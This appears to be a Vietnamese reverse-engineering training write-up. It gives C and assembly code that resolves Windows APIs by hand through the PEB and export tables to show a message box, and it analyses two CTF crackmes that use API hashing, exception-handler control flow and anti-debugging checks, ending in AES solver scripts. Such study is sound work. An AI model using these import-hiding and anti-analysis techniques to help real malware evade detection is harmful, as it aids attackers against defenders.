# Task 5: Resolve API

### Yêu cầu
> #### Tìm hiểu và code chương trình thực hiện resolve windows api và gọi messagebox, lưu ý tất cả các hàm winapi phải thực hiện resolve, code cả c và asm (giải thích rõ ràng ý tưởng, code)

## Resolve API
- Resolve API là kĩ thuật mà chương trình không import API trực tiếp mà tự tìm địa chỉ của API.

Ý tưởng:
Sử dụng `GetModuleHandleA` để lấy địa chỉ của dll.

Ex: 
```cpp!
 HMODULE kernel32dll  = GetModuleHandleA("kernel32.dll");
```
Sau đó dùng `GetProcAddress` để resolve

Ex:
```cpp!
myIsDebuggerPresent  = GetProcAddress(kernel32dll, "IsDebuggerPresent");
```
### GetModuleHandleA
Vậy `GetModuleHandleA` hoạt động như thế nào? 
1. Truy cập PEB của process
2. Xác định `InMemoryOrderModuleList` trong cấu trúc Ldr của PEB 
3. Lặp qua danh sách liên kết của các module đã được load
4. So sánh base name của từng module với tên module mong muốn
5. Nếu tìm thấy trùng khớp, trả về địa chỉ base (đóng vai trò như handle) của module đó


Code ([nguồn](https://cocomelonc.github.io/malware/2023/04/08/malware-av-evasion-15.html))
```clike
HMODULE myGetModuleHandle(LPCWSTR lModuleName) {

    PEB* pPeb = (PEB*)__readgsqword(0x60);
// Lấy model đc load vào process
    PEB_LDR_DATA* Ldr = pPeb->Ldr;
    LIST_ENTRY* ModuleList = &Ldr->InMemoryOrderModuleList;

    LIST_ENTRY* pStartListEntry = ModuleList->Flink;

    WCHAR mystr[MAX_PATH] = { 0 };
    WCHAR substr[MAX_PATH] = { 0 };
    for (LIST_ENTRY* pListEntry = pStartListEntry; pListEntry != ModuleList; pListEntry = pListEntry->Flink) {
 // lấy address của LDR_DATA_TABLE_ENTRY hiện tại
        LDR_DATA_TABLE_ENTRY* pEntry = (LDR_DATA_TABLE_ENTRY*)((BYTE*)pListEntry - sizeof(LIST_ENTRY));
// check xem cái có phải dll mình cần 
        memset(mystr, 0, MAX_PATH * sizeof(WCHAR));
        memset(substr, 0, MAX_PATH * sizeof(WCHAR));
        wcscpy(mystr, pEntry->FullDllName.Buffer);
        wcscpy(substr, lModuleName);
        if (cmpUnicodeStr(substr, mystr)) {
            return (HMODULE)pEntry->DllBase;
        }
    }

    printf("failed to get a handle to %ls\n", lModuleName);
    return NULL;
}
```
### GetProcAddress
`GetProcAddress` là 1 hàm Windows API lấy địa chỉ của 1 function đã đc xuất ra hoặc 1 biến từ dll nhất định. Đây nó đc sử dụng để load function từ dll trong runtime 

```cpp!
FARPROC GetProcAddress(
  HMODULE hModule,
  LPCSTR  lpProcName
);
```
- `hModule` - Là handle của DLL module, chứa functions hoặc biến. Function `LoadLibrary` trả lại handle này 
- `lpProcName` - Tên function hoặc biến dưới dạng chuỗi kết thúc bằng ký tự null, hoặc giá trị thứ tự của function. Nếu tham số này là một giá trị thứ tự, nó phải nằm trong low-order, và high-order word phải bằng không.
```cpp
FARPROC myGetProcAddress(HMODULE hModule, LPCSTR lpProcName) {
  PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
  PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader ->e_lfanew);
  PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule + 
  ntHeaders ->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

  DWORD* addressOfFunctions = (DWORD*)((BYTE*)hModule + exportDirectory->AddressOfFunctions);
  WORD* addressOfNameOrdinals = (WORD*)((BYTE*)hModule + exportDirectory->AddressOfNameOrdinals);
  DWORD* addressOfNames = (DWORD*)((BYTE*)hModule + exportDirectory->AddressOfNames);

  for (DWORD i = 0; i < exportDirectory->NumberOfNames; ++i) {
    if (strcmp(lpProcName, (const char*)hModule + addressOfNames[i]) == 0) {
      return (FARPROC)((BYTE*)hModule + addressOfFunctions[addressOfNameOrdinals[i]]);
    }
  }

  return NULL;
}
```
1. Lấy header của DOZ và NT:
-- Đổi base address của `hModule` thành pointer `PIMAGE_DOS_HEADER` và sử dụng nó để xác định address của cấu trúc `PIMAGE_NT_HEADERS` bằng cách cộng `e_lfanew` field vào base address
2. Tìm export directory:
-- Sử dụng `OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress` từ cấu trúc `PIMAGE_NT_HEADERS`để tìm cấu trúc `PIMAGE_EXPORT_DIRECTORY`
3. Lấy pointer tới export table:
-- Lấy pointer đến các table `AddressOfFunctions`, `AddressOfNameOrdinals` và `AddressOfNames` bằng cách sử dụng các trường tương ứng của cấu trúc `PIMAGE_EXPORT_DIRECTORY` và base address của module.
4. Lặp, tìm các tên:
-- Lặp qua `AddressOfNames` tối đa `NumberOfNames` lần, và so sánh từng tên function với tên function cần có (lpProcName) bằng hàm `strcmp`.
5. Tìm địa chỉ function: 
-- Nếu tên hàm khớp, tìm ordinal của function bằng cách tra cứu bảng `AddressOfNameOrdinals`, và sử dụng số đó để tra cứu bảng `AddressOfFunctions`. Tính toán address của function bằng cách cộng base address của module với virtual address (RVA) của function.

Kết hợp cả 2 đoạn lại
```cpp
#include <stdlib.h>
#include <stdio.h>
#include <windows.h>
#include <winternl.h>
#include <shlwapi.h>
#include <string.h>

#pragma comment(lib, "Shlwapi.lib")

int cmpUnicodeStr(WCHAR substr[], WCHAR mystr[]) {
    _wcslwr_s(substr, MAX_PATH);
    _wcslwr_s(mystr, MAX_PATH);

    int result = 0;
    if (StrStrW(mystr, substr) != NULL) {
        result = 1;
    }

    return result;
}

typedef UINT(CALLBACK* fnMessageBoxA)(
    HWND   hWnd,
    LPCSTR lpText,
    LPCSTR lpCaption,
    UINT   uType
    );

HMODULE myGetModuleHandle(LPCWSTR lModuleName) {
    PEB* pPeb = (PEB*)__readgsqword(0x60);

    PEB_LDR_DATA* Ldr = pPeb->Ldr;
    LIST_ENTRY* ModuleList = &Ldr->InMemoryOrderModuleList;
    LIST_ENTRY* pStartListEntry = ModuleList->Flink;

    WCHAR mystr[MAX_PATH] = { 0 };
    WCHAR substr[MAX_PATH] = { 0 };
    for (LIST_ENTRY* pListEntry = pStartListEntry; pListEntry != ModuleList; pListEntry = pListEntry->Flink) {
        LDR_DATA_TABLE_ENTRY* pEntry = (LDR_DATA_TABLE_ENTRY*)((BYTE*)pListEntry - sizeof(LIST_ENTRY));

        memset(mystr, 0, MAX_PATH * sizeof(WCHAR));
        memset(substr, 0, MAX_PATH * sizeof(WCHAR));
        wcscpy_s(mystr, MAX_PATH, pEntry->FullDllName.Buffer);
        wcscpy_s(substr, MAX_PATH, lModuleName);
        if (cmpUnicodeStr(substr, mystr)) {
            return (HMODULE)pEntry->DllBase;
        }
    }
    return NULL;
}

FARPROC myGetProcAddress(HMODULE hModule, LPCSTR lpProcName) {
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule +
        ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD* addressOfFunctions = (DWORD*)((BYTE*)hModule + exportDirectory->AddressOfFunctions);
    WORD* addressOfNameOrdinals = (WORD*)((BYTE*)hModule + exportDirectory->AddressOfNameOrdinals);
    DWORD* addressOfNames = (DWORD*)((BYTE*)hModule + exportDirectory->AddressOfNames);

    for (DWORD i = 0; i < exportDirectory->NumberOfNames; ++i) {
        if (strcmp(lpProcName, (const char*)hModule + addressOfNames[i]) == 0) {
            return (FARPROC)((BYTE*)hModule + addressOfFunctions[addressOfNameOrdinals[i]]);
        }
    }

    return NULL;
}

int main(int argc, char* argv[]) {
    HMODULE mod = myGetModuleHandle(L"user32.dll");
    if (NULL == mod) {
        return -2;
    }
    else {
        printf("dc");
    }

    fnMessageBoxA myMessageBoxA = (fnMessageBoxA)myGetProcAddress(mod, "MessageBoxA");
    myMessageBoxA(NULL, "asm la gi", ".....", MB_OK);
    return 0;
}
```
Đây là bản ASM
```asm
global main

extern ExitProcess

section .data
    kernel32_str db "KERNEL32.DLL", 0
    getproc_str  db "GetProcAddress", 0
    msgbox_str   db "MessageBoxA", 0
    user32_str   db "USER32.DLL", 0
    loadlib_str db "LoadLibraryA", 0
    text db "haaha..", 0
    caption db ".", 0

section .bss
    kernel32_base resq 1
    getproc_addr  resq 1
    msgbox_addr   resq 1
    loadlib_addr resq 1
    user32_base  resq 1
section .text

; p.biệt hoa và thường 

strcmp:
.cmp:
    mov al, [rdi] 
    mov cl, [rsi]  
    cmp al, cl
    jne .noteq
    test al, al
    je .eq
    inc rdi
    inc rsi
    jmp .cmp
.eq:
    xor rax, rax
    ret
.noteq:
    mov rax, 1
    ret


; lấy kernel32 base qua PEB

get_kernel32:
    mov rax, [gs:0x60]        ; PEB
    mov rax, [rax + 0x18]     ; PEB->Ldr
    mov rax, [rax + 0x20]     ; InMemoryOrderModuleList
    mov rax, [rax]            ; ntdll
    mov rax, [rax]            ; kernel32
    mov rax, [rax + 0x20]     ; DllBase
    ret

.next:
    mov rbx, [rbx]            
    mov rcx, [rbx + 0x50]     ; BaseDllName 
    mov rax, [rbx + 0x20]     ; DllBase
    ret


; export table
resolve_export:
    push rbx  
    push rsi 
    push rdi 
    push r12 
    push r13 
    push r14 
    push r15

    mov rbx, rcx              ; module base

    mov eax, [rbx + 0x3C]
    add rax, rbx              ; PE header

    mov eax, [rax + 0x88]     ; export table RVA
    add rax, rbx

    mov r12d, [rax + 0x18]    ; NumberOfNames
    mov r13d, [rax + 0x20]    ; AddressOfNames
    add r13, rbx

    mov r14d, [rax + 0x24]    ; AddressOfNameOrdinals
    add r14, rbx

    mov r15d, [rax + 0x1C]    ; AddressOfFunctions
    add r15, rbx

.loop:
    test r12d, r12d              ; test nếu NumberOfNames == 0
    jz .notfound                

    dec r12d                     ; index-- 

    mov esi, [r13 + r12*4]       ; lấy RVA của tên function từ mảng AddressOfNames 
    add rsi, rbx                 ; chuyển RVA thành VA

    mov rdi, rdx                 ; rdi = tên của function mình muốn
    call strcmp                  ; cmp tên export vs tên đó
    cmp rax, 0                   
    jne .loop                    
   ; nếu thấy 
    movzx eax, word [r14 + r12*2] ; lấy ordinal index từ AddressOfNameOrdinals
    mov eax, [r15 + rax*4]        ; lấy function RVA từ AddressOfFunctions
    add rax, rbx                 ; chuyển RVA → VA 
    jmp .done                    

.notfound:
    xor rax, rax               
.done:
    ; hồi phục lại registers
    pop r15 
    pop r14 
    pop r13 
    pop r12 
    pop rdi 
    pop rsi 
    pop rbx 
    ret      ; rax = function pointer


main:
    sub rsp, 40

    ; lấy kernel32 base
    call get_kernel32
    mov [rel kernel32_base], rax

    ; resolve GetProcAddress
    mov rcx, rax
    mov rdx, getproc_str
    call resolve_export
    mov [rel getproc_addr], rax

    ; resolve LoadLibraryA
    mov rcx, [rel kernel32_base]
    mov rdx, loadlib_str            
    call resolve_export
    mov [rel loadlib_addr], rax

    ; call LoadLibraryA
    lea rcx, [rel user32_str]        
    call [rel loadlib_addr]
    mov [rel user32_base], rax

    ; resolve MessageBoxA 
    mov rcx, rax
    mov rdx, msgbox_str
    call resolve_export
    mov [rel msgbox_addr], rax

    ; call MessageBoxA
    xor rcx, rcx
    lea rdx, [rel text]
    lea r8,  [rel caption]
    xor r9, r9
    call [rel msgbox_addr]
exit:
    xor rcx, rcx
    call ExitProcess
```

# Sub task
## VEH
Mới vào chương trình dẫn mình đến đoạn này 
```asm 
.text:00007FF6D2862540 push    rsi
.text:00007FF6D2862541 sub     rsp, 20h
.text:00007FF6D2862545 call    sub_7FF6D28611F0
.text:00007FF6D286254A mov     cs:dword_7FF6D2865108, 0
.text:00007FF6D2862554 mov     ecx, 0C11AD5C5h
.text:00007FF6D2862559 mov     edx, 145370BBh
.text:00007FF6D286255E call    sub_7FF6D2861000
.text:00007FF6D2862563 lea     rdx, sub_7FF6D28611A0
.text:00007FF6D286256A mov     ecx, 1
.text:00007FF6D286256F call    rax
.text:00007FF6D2862571 mov     cs:dword_7FF6D286510C, 0
.text:00007FF6D286257B mov     r8, 0FFFFFFFFE3B9876Ah
.text:00007FF6D2862582 mov     r9, 29CDD463h
.text:00007FF6D2862589 xor     rax, rax
.text:00007FF6D286258C div     rax
.text:00007FF6D286258C ; ---------------------------------------------------------------------------
.text:00007FF6D286258F db 0E9h
.text:00007FF6D2862590 db  48h ; H
.text:00007FF6D2862591 db  89h
.text:00007FF6D2862592 db 0C6h
.text:00007FF6D2862593 ; ---------------------------------------------------------------------------
.text:00007FF6D2862593 mov     ecx, 0FFFFFFF6h
.text:00007FF6D2862598 call    rax
.text:00007FF6D286259A mov     cs:qword_7FF6D28650F8, rax
.text:00007FF6D28625A1 mov     ecx, 0FFFFFFF5h
.text:00007FF6D28625A6 call    rsi
.text:00007FF6D28625A8 mov     cs:qword_7FF6D2865100, rax
.text:00007FF6D28625AF mov     cs:dword_7FF6D2865110, 0
.text:00007FF6D28625B9 add     rsp, 20h
.text:00007FF6D28625BD pop     rsi
.text:00007FF6D28625BE retn
.text:00007FF6D28625BE sub_7FF6D2862540 endp ; sp-analysis failed
```
Ở đoạn này 
```asm
.text:00007FF6D2862554 mov     ecx, 0C11AD5C5h
.text:00007FF6D2862559 mov     edx, 145370BBh
.text:00007FF6D286255E call    sub_7FF6D2861000
.text:00007FF6D2862563 lea     rdx, sub_7FF6D28611A0
.text:00007FF6D286256A mov     ecx, 1
.text:00007FF6D286256F call    rax
```
Chương trình thực hiện call API resolver và call resolved API `ntdll_RtlAddVectoredExceptionHandler` là API mà đoạn code đã call, vậy chương trình đã cài exception handler
Tiếp theo 
```asm 
mov r8, 0FFFFFFFFE3B9876Ah
mov r9, 29CDD463h
xor rax, rax
div rax
```
Chương trình `div rax` trong khi rax = 0, vì vậy sẽ tạo lỗi `divide by zero exception` và kích hoạt `AddVectoredExceptionHandler` thế nên flow sẽ được tiếp tục trong `sub_7FF6D28611A0`
```cpp
__int64 __fastcall sub_7FF6D28611A0(__int64 a1)
{
  *(_QWORD *)(*(_QWORD *)(a1 + 8) + 120LL) = sub_7FF6D2861000(
                                               *(_DWORD *)(*(_QWORD *)(a1 + 8) + 184LL),
                                               *(_DWORD *)(*(_QWORD *)(a1 + 8) + 192LL));
  *(_QWORD *)(*(_QWORD *)(a1 + 8) + 248LL) += 4LL;
  return 0xFFFFFFFFLL;
}
```
Theo như các chuyên gia phân tích thì ở đây chương trình thực hiện 
```asm
mov r8, func_hash
mov r9, module_hash
xor rax, rax
div rax
```
CPU sẽ bị lỗi `integer division by zero exception` lỗi này cũng được kích hoạt bởi `div rax` ban nãy. Sau đó win sẽ gọi tự exception handler 

Tiếp theo, `div rax` có bytes là `48 F7 F0` nhưng tác giả lại thêm 1 byte `E9` nữa

Vậy logic là `div rax` chia 0 = lỗi -> exception -> exception handler -> `rax` = API call

Vậy mình sẽ ngồi mò hết đống API này :sob:

Những API mà mình tìm được là

```
LoadLibraryW
memset
memcmp
memcpy
WriteFile
ReadFile
CryptReleaseContext
CryptDestroyKey
CryptImportKey
CryptAcquireContextA
CryptSetKeyParam
CryptEncrypt
GetLastError
```

Hàm `sub_7FF6D6F31640` là nơi tạo key/thuật toán
![{42E2AF04-24D7-46BA-B963-B2ED6841F67E}](https://hackmd.io/_uploads/S1LNr2Iqbg.png)
Sau khi giải xong nó sẽ tự xóa key.
![{E9382D77-F4C5-4DF7-A61F-0210D72141C8}](https://hackmd.io/_uploads/ByKh06Lq-g.png)
Ở khúc này mình có 1 doạn loop, loop hết ta được một url (https://www.youtube.com/watch?v=dQw4w9WgXcQ)

Nếu chúng ta chạy xuống chút nữa thì ct sẽ xóa nó ;/
![{99C7BDBC-9ACC-4A68-BFD0-5570CF34F319}](https://hackmd.io/_uploads/B1ktkRU5Zx.png)

Ở khúc này 
![{EBF6EF3C-0CE8-457F-9F79-417BCECE72C2}](https://hackmd.io/_uploads/ByrnoALq-g.png)
Ct có gọi `CryptSetKeyParam` và số byte của nó là 16 từ 1 -> 16 vậy đây là Initialization Vector
Tiếp theo mình phát hiện đoạn này
![{0F1D9638-1661-478A-B91E-69C25EABC01B}](https://hackmd.io/_uploads/H1mopAL5Zg.png)
Nó có gọi `sub_7FF6D6F319A0` là AES, có length là 32 và nó có resolve memcmp `memcmp(encrypted_output, this, 32)` vậy `unk_7FF6D6F35000` là ciphertext của chúng ta
```py
#from gpt with luv
import hashlib
from Crypto.Cipher import AES

url   = b"https://www.youtube.com/watch?v=dQw4w9WgXcQ"
key   = hashlib.sha256(url).digest()
IV    = bytes(range(1, 17)) 
ciphertext    = bytes.fromhex("e560440942c4bbdef6a12d93d91d1372af8d4cf7a79f1fb999689cb8c24c4f85")

cipher = AES.new(key, AES.MODE_CBC, IV)
pt     = cipher.decrypt(ciphertext)
#padding (1 byte of 0x01)
flag   = pt[:-pt[-1]]
print(flag)
```
![{398AFA2A-1308-4D1A-A064-D8812AFDEE35}](https://hackmd.io/_uploads/rk48lJDcbg.png)


## Wannaflag
Vào main
```ccp
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char *v3; // esi
  HANDLE FileA; // esi
  DWORD v5; // esi
  DWORD v6; // edi
  DWORD v7; // eax
  DWORD v8; // edx
  DWORD v9; // esi
  CHAR *v10; // edi
  DWORD v11; // ecx
  int result; // eax
  DWORD NumberOfBytesRead; // [esp+10h] [ebp-808h] BYREF
  _BYTE v14[192]; // [esp+18h] [ebp-800h] BYREF
  int v15; // [esp+D8h] [ebp-740h] BYREF
  int v16; // [esp+DCh] [ebp-73Ch]
  int v17; // [esp+E0h] [ebp-738h]
  int v18; // [esp+E4h] [ebp-734h]
  int v19; // [esp+E8h] [ebp-730h]
  int v20; // [esp+ECh] [ebp-72Ch]
  int v21; // [esp+F0h] [ebp-728h]
  int i; // [esp+F4h] [ebp-724h]
  CHAR Filename[264]; // [esp+F8h] [ebp-720h] BYREF
  CHAR Buffer[1024]; // [esp+308h] [ebp-510h] BYREF
  CHAR FileName[268]; // [esp+708h] [ebp-110h] BYREF

  memset(Buffer, 0, sizeof(Buffer));
  GetModuleFileNameA(0, Filename, 0x104u);
  if ( IsDebuggerPresent() )
    goto LABEL_24;
  v3 = strrchr(Filename, 92);
  if ( IsDebuggerPresent() )
    goto LABEL_24;
  if ( v3 )
    v3[1] = 0;
  sub_231360(FileName, 0x104u, "%s%s", (char)Filename);
  FileA = CreateFileA(FileName, 0x80000000, 0, 0, 3u, 0, 0);
  if ( IsDebuggerPresent() )
    goto LABEL_24;
  if ( FileA != (HANDLE)-1 && ReadFile(FileA, Buffer, 0x400u, &NumberOfBytesRead, 0) )
  {
    CloseHandle(FileA);
    v5 = 16 - (NumberOfBytesRead & 0xF);
    if ( !IsDebuggerPresent() )
    {
      v6 = 0;
      if ( v5 )
      {
        v6 = v5;
        memset(&Buffer[NumberOfBytesRead], v5, v5);
      }
      v7 = v6 + NumberOfBytesRead;
      NumberOfBytesRead = v7;
      if ( v7 >= 0x400 )
        __report_rangecheckfailure();
      Buffer[v7] = 0;
      v15 = -1448796403;
      v16 = -2133891425;
      v17 = 1676089180;
      v18 = -1110616710;
      v19 = -426315469;
      v20 = 1338778897;
      v21 = -1038548038;
      i = -738310864;
      AES_key_expansion(v14, &v15);
      if ( !IsDebuggerPresent() )
      {
        v8 = NumberOfBytesRead;
        v9 = NumberOfBytesRead >> 4;
        if ( NumberOfBytesRead >> 4 )
        {
          v10 = Buffer;
          do
          {
            AES_encrypt(v10, v14);
            v10 += 16;
            --v9;
          }
          while ( v9 );
          v8 = NumberOfBytesRead;
        }
        v11 = 0;
        v15 = 1029662604;
        v16 = 837762801;
        v17 = -682434832;
        v18 = -1806848824;
        v19 = -524838890;
        v20 = 220915250;
        v21 = -1681108108;
        for ( i = 982145798; v11 < v8; ++v11 )
          Buffer[v11] ^= *((_BYTE *)&v15 + (int)v11 % 32);
        if ( !IsDebuggerPresent() && !IsDebuggerPresent() && !IsDebuggerPresent() )
        {
          result = (int)Buffer;
          MEMORY[0] = 0;
          return result;
        }
      }
    }
LABEL_24:
    ExitProcess(0xFFFFFFFF);
  }
  return 1;
}
```
Đầu tiên mình thấy được chương trình đang mã hóa file `fl4g_f0r_y0u.txt` 2 lần 
Lần 1 
```cpp
      v7 = v6 + NumberOfBytesRead;
      NumberOfBytesRead = v7;
      if ( v7 >= 1024 )
        __report_rangecheckfailure();
      Buffer[v7] = 0;
      v15 = -1448796403;
      v16 = -2133891425;
      v17 = 1676089180;
      v18 = -1110616710;
      v19 = -426315469;
      v20 = 1338778897;
      v21 = -1038548038;
      i = -738310864;
      sub_231000(v14, &v15);
```
Trong `sub_231000` có thêm 1 đoạn mã hóa như vậy nữa
```cpp
v2 = *a2 ^ 0x42;
  v3 = (_BYTE *)a1;
  v4 = a2[13] ^ 0x4D;
  v5 = a2[14] ^ 0x58;
  v3[13] = v4;
  *v3 = v2;
  v6 = a2[1] ^ 0x4D;
  v3[14] = v5;
  v3[1] = v6;
  v7 = a2[15];
  v3[2] = a2[2] ^ 0x58;
  v3[3] = a2[3] ^ 0x63;
  v3[4] = a2[4] ^ 0x42;
  v3[5] = a2[5] ^ 0x4D;
  v3[6] = a2[6] ^ 0x58;
  v3[7] = a2[7] ^ 0x63;
  v3[8] = a2[8] ^ 0x42;
  v3[9] = a2[9] ^ 0x4D;
  v3[10] = a2[10] ^ 0x58;
  v3[11] = a2[11] ^ 0x63;
  v3[12] = a2[12] ^ 0x42;
  result = v3 + 13;
  v3[15] = v7 ^ 0x63;
  LOBYTE(a1) = 4;
  v11 = 4;
  do
  {
    v9 = v4;
    v10 = *(result - 1);
    v12 = result[1];
    v13 = result[2];
    if ( (a1 & 3) == 0 )
    {
      v12 = byte_237138[v13];
      v13 = byte_237138[v10];
      v10 = byte_237138[v4] ^ byte_237338[v11 >> 2];
      v9 = byte_237138[(unsigned __int8)result[1]];
    }
    result[3] = v10 ^ *(result - 13);
    v4 = v9 ^ *(result - 12);
    result[4] = v4;
    result[5] = v12 ^ *(result - 11);
    result[6] = v13 ^ *(result - 10);
    result += 4;
    a1 = v11 + 1;
    v11 = a1;
  }
  while ( a1 < 0x2C );
  return result;
}
```
Và `sub_231140` 
```cpp
  v2 = a1;
  v33 = a1;
  v3 = a2 - (_DWORD)a1;
  v4 = 4;
  do
  {
    v5 = 4;
    do
    {
      *a1 ^= a1[v3];
      ++a1;
      --v5;
    }
    while ( v5 );
    --v4;
  }
  while ( v4 );
  for ( i = 1; ; ++i )
  {
    v6 = v2;
    v7 = 4;
    do
    {
      v8 = v6;
      v9 = 4;
      do
      {
        v10 = *v8;
        v8 += 4;
        *(v8 - 4) = byte_237138[v10];
        --v9;
      }
      while ( v9 );
      ++v6;
      --v7;
    }
    while ( v7 );
    v11 = v2[1];
    v2[1] = v2[5];
    v2[5] = v2[9];
    v2[9] = v2[13];
    v12 = v2[10];
    v2[13] = v11;
    v13 = v2[2];
    v2[2] = v12;
    v14 = v2[14];
    v2[10] = v13;
    v15 = v2[6];
    v2[6] = v14;
    v16 = v2[15];
    v2[14] = v15;
    v17 = v2[3];
    v2[3] = v16;
    v2[15] = v2[11];
    result = v2[7];
    v2[11] = result;
    v2[7] = v17;
    if ( i == 10 )
      break;
    v19 = v2 + 2;
    v20 = 4;
    do
    {
      v21 = v19[1];
      v19 += 4;
      v22 = *(v19 - 4);
      v23 = *(v19 - 5);
      v35 = *(v19 - 6);
      v24 = v23 ^ v35 ^ v22 ^ v21;
      *(v19 - 6) = v24 ^ v35 ^ (2 * (v23 ^ v35)) ^ (27 * ((unsigned __int8)(v23 ^ v35) >> 7));
      *(v19 - 5) = v24 ^ v23 ^ (2 * (v22 ^ v23)) ^ (27 * ((unsigned __int8)(v22 ^ v23) >> 7));
      *(v19 - 4) = v24 ^ v22 ^ (2 * (v22 ^ v21)) ^ (27 * ((unsigned __int8)(v22 ^ v21) >> 7));
      *(v19 - 3) = v24 ^ v21 ^ (2 * (v21 ^ v35)) ^ (27 * ((unsigned __int8)(v21 ^ v35) >> 7));
      --v20;
    }
    while ( v20 );
    v25 = 4;
    v2 = v33;
    v26 = v33;
    v27 = (char *)(a2 + 16 * i);
    do
    {
      v28 = 4;
      do
      {
        v29 = *v27++;
        *v26++ ^= v29;
        --v28;
      }
      while ( v28 );
      --v25;
    }
    while ( v25 );
  }
  v30 = 4;
  v31 = (_BYTE *)(a2 + 160);
  do
  {
    v32 = 4;
    do
    {
      LOBYTE(result) = *v31++;
      *v2++ ^= result;
      --v32;
    }
    while ( v32 );
    --v30;
  }
  while ( v30 );
  return result;
}
```
Lần 2
```cpp
v8 = NumberOfBytesRead;
        }
        v11 = 0;
        v15 = 1029662604;
        v16 = 837762801;
        v17 = -682434832;
        v18 = -1806848824;
        v19 = -524838890;
        v20 = 220915250;
        v21 = -1681108108;
        for ( i = 982145798; v11 < v8; ++v11 )
          Buffer[v11] ^= *((_BYTE *)&v15 + (int)v11 % 32);
```
Nghĩ rằng có thể tạo solver luôn, nhưng ở phần asm nó có một đoạn code như vậy nhìn khá là lạ

![{73819804-0EFE-459C-B4E2-F384FB705113}](https://hackmd.io/_uploads/HkfwKDcqZx.png)

nên mình sẽ patch `IsDebuggerPresent` và vào xem nó làm gì

![image](https://hackmd.io/_uploads/ByHLiPc9-g.png)
Khi  xuống `mov [ecx], ecx` thanh ecx của mình là 0 nên ct sẽ ghi vào NULL và tạo exception

Và ở TLSCallBack
```cpp
PVOID __stdcall TlsCallback_0(int a1, int a2, int a3)
{
  return AddVectoredExceptionHandler(1u, Handler);
}
```
Mình thấy handler đã được đăng kí trước, vậy thì khi dính exception của `mov [ecx], ecx` flow sẽ tiếp tục ở `Handler`
```cpp
LONG __stdcall Handler(struct _EXCEPTION_POINTERS *ExceptionInfo)
{
  PCONTEXT ContextRecord; // ecx
  PCONTEXT *p_ContextRecord; // edi
  DWORD Edx; // eax
  unsigned int Ebx; // esi
  unsigned int v6; // eax
  DWORD Eax; // edx
  DWORD *p_Eax; // ebx
  unsigned int v9; // ecx
  DWORD v10; // ebx
  struct _EXCEPTION_POINTERS *ExceptionInfoa; // [esp+Ch] [ebp+8h]

  if ( ExceptionInfo->ExceptionRecord->ExceptionCode == -1073741819 )
  {
    ContextRecord = ExceptionInfo->ContextRecord;
    p_ContextRecord = &ExceptionInfo->ContextRecord;
    Edx = ContextRecord->Edx;
    Ebx = ContextRecord->Ebx;
    switch ( Edx )
    {
      case 0u:
        *(_BYTE *)(ContextRecord->Eax + Ebx) ^= 0xDu;
        (*p_ContextRecord)->Eip += 3;
        return -1;
      case 1u:
        *(_BYTE *)(ContextRecord->Eax + Ebx) += 37;
        (*p_ContextRecord)->Eip += 4;
        return -1;
      case 2u:
        *(_BYTE *)(ContextRecord->Eax + Ebx) -= 37;
        (*p_ContextRecord)->Eip += 5;
        return -1;
      case 3u:
        *(_BYTE *)(ContextRecord->Eax + Ebx) ^= 0x25u;
        (*p_ContextRecord)->Eip += 3;
        return -1;
      case 4u:
        *(_BYTE *)(ContextRecord->Eax + Ebx) += 13;
        (*p_ContextRecord)->Eip += 4;
        return -1;
      case 5u:
        *(_BYTE *)(ContextRecord->Eax + Ebx) -= 13;
        (*p_ContextRecord)->Eip += 5;
        return -1;
    }
    if ( Edx != 6 )
      return -1;
    v6 = 0;
    if ( !Ebx )
      goto LABEL_30;
    if ( Ebx < 8 )
      goto LABEL_29;
    Eax = ContextRecord->Eax;
    ExceptionInfoa = (struct _EXCEPTION_POINTERS *)(Eax + Ebx - 1);
    p_Eax = &ContextRecord->Eax;
    if ( Eax <= (unsigned int)p_ContextRecord && ExceptionInfoa >= (struct _EXCEPTION_POINTERS *)p_ContextRecord )
      goto LABEL_29;
    if ( Eax <= (unsigned int)p_Eax && ExceptionInfoa >= (struct _EXCEPTION_POINTERS *)p_Eax )
      goto LABEL_29;
    if ( Ebx >= 0x40 )
    {
      v9 = ContextRecord->Ebx & 0x3F;
      do
      {
        *(__m128i *)(Eax + v6) = _mm_andnot_si128(*(__m128i *)(Eax + v6), (__m128i)xmmword_237390);
        *(__m128i *)(Eax + v6 + 16) = _mm_andnot_si128(*(__m128i *)(Eax + v6 + 16), (__m128i)xmmword_237390);
        *(__m128i *)(Eax + v6 + 32) = _mm_andnot_si128(*(__m128i *)(Eax + v6 + 32), (__m128i)xmmword_237390);
        *(__m128i *)(Eax + v6 + 48) = _mm_andnot_si128(*(__m128i *)(Eax + v6 + 48), (__m128i)xmmword_237390);
        v6 += 64;
      }
      while ( v6 < Ebx - v9 );
      if ( v9 < 8 )
      {
LABEL_28:
        while ( v6 < Ebx )
        {
LABEL_29:
          *(_BYTE *)((*p_ContextRecord)->Eax + v6) = ~*(_BYTE *)((*p_ContextRecord)->Eax + v6);
          ++v6;
        }
LABEL_30:
        (*p_ContextRecord)->Eip += 4;
        return -1;
      }
      ContextRecord = *p_ContextRecord;
    }
    v10 = ContextRecord->Eax;
    do
    {
      *(_QWORD *)(v10 + v6) = _mm_andnot_si128(_mm_loadl_epi64((const __m128i *)(v10 + v6)), (__m128i)xmmword_237390).m128i_u64[0];
      v6 += 8;
    }
    while ( v6 < Ebx - (Ebx & 7) );
    goto LABEL_28;
  }
  return 0;
}
```
<img width="621" height="45" alt="{42131C75-C83F-4426-868A-1C636407BA88}" src="https://github.com/user-attachments/assets/1ddd40a9-3f69-49fc-85fe-d70221e51a08" />

Trong `ExceptionInfo` có chứa thông tin của `ExceptionRecord` và `ContextInfo`. 
